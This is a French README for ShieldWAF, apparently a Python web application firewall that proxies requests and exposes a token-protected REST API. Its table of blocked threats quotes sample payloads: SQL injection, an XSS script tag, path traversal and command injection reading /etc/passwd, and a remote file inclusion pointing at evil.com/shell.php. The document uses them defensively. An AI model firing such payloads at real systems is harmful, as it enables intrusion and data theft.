# 🛡 ShieldWAF — Web Application Firewall en Python

Un WAF (pare-feu applicatif web) complet qui se place devant votre application
et filtre toutes les requêtes entrantes en temps réel.

---

## 📁 Structure

```
shieldwaf/
├── main.py              ← Serveur FastAPI (proxy + API REST)
├── requirements.txt     ← Dépendances Python
├── waf/
│   ├── __init__.py
│   ├── engine.py        ← Moteur de détection (cœur du WAF)
│   └── models.py        ← Modèles de données
```

---

## 🚀 Installation & Démarrage

### 1. Installer les dépendances
```bash
pip install -r requirements.txt
```

### 2. Configurer votre application cible
Dans `main.py`, modifiez :
```python
CONFIG = {
    "target_url": "http://localhost:8080",  # ← URL de VOTRE app
    "api_token":  "changez-ce-token",       # ← Votre token secret
    ...
}
```

### 3. Lancer le WAF
```bash
python main.py
```

Le WAF écoute sur le port **8000** et redirige le trafic vers votre app.

---

## 🔒 Ce que le WAF détecte

| Menace                  | Exemple d'attaque bloquée                     |
|-------------------------|-----------------------------------------------|
| SQL Injection           | `?id=1' OR 1=1--`                             |
| XSS                     | `<script>alert(1)</script>`                   |
| Path Traversal          | `/../../../etc/passwd`                        |
| Remote File Inclusion   | `?page=http://evil.com/shell.php`             |
| Injection de commandes  | `; cat /etc/passwd`                           |
| Scanners (Nikto, sqlmap)| User-Agent détecté                            |
| Rate Limiting           | > 100 req/min par IP                          |
| IP Blacklist/Whitelist  | Règles IP manuelles ou CIDR                   |

---

## 🌐 API REST

Toutes les routes commencent par `/waf/` et nécessitent un token Bearer.

```bash
# En-tête d'authentification
Authorization: Bearer waf-secret-token-changez-moi
```

### Endpoints disponibles

| Méthode | Route              | Description                        |
|---------|--------------------|------------------------------------|
| GET     | /waf/stats         | Statistiques globales              |
| GET     | /waf/logs          | Journal des requêtes               |
| GET     | /waf/ips           | Liste des règles IP                |
| POST    | /waf/ips           | Ajouter une règle IP               |
| DELETE  | /waf/ips/{ip}      | Supprimer une règle IP             |
| GET     | /waf/rules         | Liste des règles WAF               |
| PUT     | /waf/rules/{id}    | Activer/désactiver une règle       |
| POST    | /waf/analyze       | Tester une requête manuellement    |

### Exemples curl

```bash
TOKEN="waf-secret-token-changez-moi"

# Stats
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/waf/stats

# Bloquer une IP
curl -X POST http://localhost:8000/waf/ips \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ip":"1.2.3.4","type":"block","reason":"Attaque détectée"}'

# Voir les logs bloqués
curl "http://localhost:8000/waf/logs?action=block&limit=20" \
  -H "Authorization: Bearer $TOKEN"

# Tester une requête SQLi
curl -X POST http://localhost:8000/waf/analyze \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"path":"/search","query_string":"q=1 OR 1=1--"}'
```

---

## 🏗 Architecture

```
Internet → [ShieldWAF :8000] → [Votre App :8080]
                ↓
         Analyse chaque requête :
         1. IP blacklist/whitelist
         2. Rate limiting
         3. User-Agent (scanners)
         4. Chemins suspects
         5. Contenu (SQLi, XSS, etc.)
                ↓
         BLOCK (403) ou ALLOW (proxy)
```

---

## 🔧 Personnalisation

### Désactiver une règle
```python
# Dans main.py > CONFIG
"rule_xss": False,  # désactive la détection XSS
```

### Ajouter un pattern personnalisé
Dans `waf/engine.py`, ajoutez votre regex dans le dictionnaire `RULES` :
```python
ThreatType.SQL_INJECTION: [
    ...
    r"votre_pattern_ici",
]
```

### Documentation interactive
Ouvrez http://localhost:8000/waf/docs dans votre navigateur.
